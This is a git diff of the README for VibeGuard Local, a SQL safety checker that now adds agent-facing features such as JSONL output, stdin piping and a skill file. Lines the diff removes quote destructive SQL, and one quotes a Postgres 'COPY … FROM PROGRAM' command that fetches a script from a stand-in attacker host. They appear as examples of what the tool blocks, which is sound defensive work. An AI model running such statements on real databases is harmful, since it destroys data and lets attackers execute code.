@@ -1,13 +1,12 @@
 # VibeGuard — Local
 
 > **AI agents are casually writing SQL that can nuke your entire production database.**
->
-> Sometimes it's `DELETE FROM users` with no `WHERE`. Sometimes it's `DROP TABLE`. Sometimes it's `COPY users FROM PROGRAM 'curl http://attacker.com/x.sh'` — yes, that's a real Postgres feature, yes it executes shell commands on your database server, and no, your AI agent doesn't know that.
->
-> **VibeGuard Local is the senior DBA review your AI doesn't know it needs.**
+> VibeGuard Local is the senior DBA review your AI doesn't know it needs.
 
 **36 battle-tested safety checks. Sub-millisecond. 100% local.**
-Runs in your editor as you type, in CI before you merge, in the CLI before you migrate, or right in your browser before you install. Nothing ever leaves your machine.
+**Now agent-native** — drop-in `SKILL.md`, stable JSONL output, `--stdin` pipe, and experimental `--reflect` mode so agents actually learn instead of repeating the same dangerous patterns.
+
+Runs in your editor as you type, in CI before you merge, in the CLI before you migrate, or right in your browser. Nothing ever leaves your machine.
 
 [![@vibeguard-dev/local](https://img.shields.io/npm/v/@vibeguard-dev/local?label=%40vibeguard-dev%2Flocal)](https://www.npmjs.com/package/@vibeguard-dev/local)
 [![eslint-plugin-vibeguard](https://img.shields.io/npm/v/eslint-plugin-vibeguard?label=eslint-plugin-vibeguard)](https://www.npmjs.com/package/eslint-plugin-vibeguard)
@@ -89,6 +88,43 @@ You don't need convincing. You need a `npm install`, an ESLint rule, and a CI st
 
 ---
 
+## For AI agents (new in v1.7)
+
+VibeGuard now speaks fluent agent. Four pieces, designed to compose:
+
+- **`--format=jsonl`** (also `--format=ndjson`) — stable, machine-readable output. One JSON object per catch on stdout, with a versioned `_schema` field. Perfect for CI gates, dashboards, and agent memory loops. Schema is committed in [`STABILITY.md`](./packages/sdk/STABILITY.md#jsonl-output-schema).
+- **`--stdin`** — pipe SQL from agent memory or a shell variable directly. No temp file, no `mktemp` dance.
+- **[`examples/agent-skill/SKILL.md`](./packages/sdk/examples/agent-skill/SKILL.md)** — drop-in skill file. Frontmatter uses only the fields Claude Code actually parses today (`name`, `description`); body is portable to Cursor / aider per the [companion README](./packages/sdk/examples/agent-skill/README.md). The skill teaches the agent to pre-flight every SQL through `vg-local` before executing.
+- **`--reflect`** *(experimental)* — emits a richer reflection object per catch with `pain_score`, `importance`, `suggested_lesson` and a templated reflection paragraph designed for agent episodic-memory ingestion. Schema is `vg-reflect/0` and is **explicitly not under semver commitments yet**; see [STABILITY.md → Reflection output schema (EXPERIMENTAL)](./packages/sdk/STABILITY.md#reflection-output-schema-experimental) and [docs/reflect-mode.md](./packages/sdk/docs/reflect-mode.md) for the graduation contract and consumption recipes.
+
+### Quick start
+
+For Claude Code, drop the skill into the right place:
+
+```bash
+mkdir -p ~/.claude/skills/vibeguard-sql-safety
+cp node_modules/@vibeguard-dev/local/examples/agent-skill/SKILL.md \
+   ~/.claude/skills/vibeguard-sql-safety/SKILL.md
+```
+
+(Project-scope alternative: `mkdir -p .claude/skills/vibeguard-sql-safety && cp …` into the project's `.claude` directory.)
+
+For Cursor or aider, the same `SKILL.md` body works — see the [companion README](./packages/sdk/examples/agent-skill/README.md) for adaptation notes.
+
+The agent's pre-flight call from then on:
+
+```bash
+echo "$SQL" | vg-local analyze --stdin --format=jsonl
+```
+
+One JSON object per catch on stdout, exit code 1 if any `block`-severity catch fires, parse errors on stderr.
+
+### What this changes
+
+VibeGuard goes from "a wall the agent bounces off" to "a teacher the agent can ingest." The JSONL output composes with `jq`, dashboards, and CI. The reflection mode (when its schema graduates) lets the agent's memory loop compound lessons across runs, keyed on stable catch IDs — three months from now the agent doesn't even propose the dangerous shape because the lesson is in its semantic memory.
+
+---
+
 ## What it does
 
 You write SQL — by hand, by template literal, or by AI agent.
@@ -98,9 +134,9 @@ Before that SQL touches your database, VibeGuard reads it and flags 36 patterns 
 The check runs **locally, in milliseconds**. Nothing leaves your machine. There are four ways to use it:
 
 - **Browser Playground** — try it instantly, no install, no signup
-- **CLI** — for `.sql` files, migrations, and CI pipelines
+- **CLI** — for `.sql` files, migrations, CI pipelines, and agents (`--stdin` + `--format=jsonl`)
 - **ESLint Plugin** — real-time underlines in `` sql`...` `` tagged templates as you type
-- **SDK** — wire it into agents, custom dashboards, or whatever your workflow is
+- **SDK** — wire it into agents, custom dashboards, or memory loops (`--format=jsonl` + `--reflect`)
 
 ---
 
@@ -139,13 +175,17 @@ const result = analyze(`UPDATE users SET email = 'x@y.com'`);
 
 `analyze()` takes a SQL string and returns an array of catches. Each catch has a stable code, a severity (`block` | `warn` | `info`), a confidence number, a human-readable message, and a suggested fix. That's the whole API.
 
-**CLI use** (best for `.sql` files and CI):
+**CLI use** (best for `.sql` files, CI, and agents):
 
 ```bash
-npx @vibeguard-dev/local init                 # scaffold a sample SQL file + npm script
-vg-local analyze 'src/**/*.sql'               # analyze files; exit code 1 on any block-severity catch
-vg-local analyze 'src/**/*.sql' --fix         # apply autofixes for SQL-001 / 005 / 006 / 011
-vg-local analyze 'src/**/*.sql' --fix-dry-run # show what would change, don't write
+npx @vibeguard-dev/local init                       # scaffold a sample SQL file + npm script
+vg-local analyze 'src/**/*.sql'                     # analyze files; exit code 1 on any block-severity catch
+vg-local analyze 'src/**/*.sql' --format=jsonl      # machine-readable output (one JSON object per catch)
+echo "$SQL" | vg-local analyze --stdin --format=jsonl
+                                                    # pipe from an agent — no temp file needed
+vg-local analyze 'src/**/*.sql' --reflect           # experimental: reflection objects for agent memory loops
+vg-local analyze 'src/**/*.sql' --fix               # apply autofixes for SQL-001 / 005 / 006 / 011
+vg-local analyze 'src/**/*.sql' --fix-dry-run       # show what would change, don't write
 ```
 
 The exit-code-1-on-block behavior is what makes it CI-friendly: drop `vg-local analyze` into a GitHub Action, and PRs that introduce a block-severity catch fail the build. Your AI can keep generating SQL all day; the build just won't let the destructive shapes through.
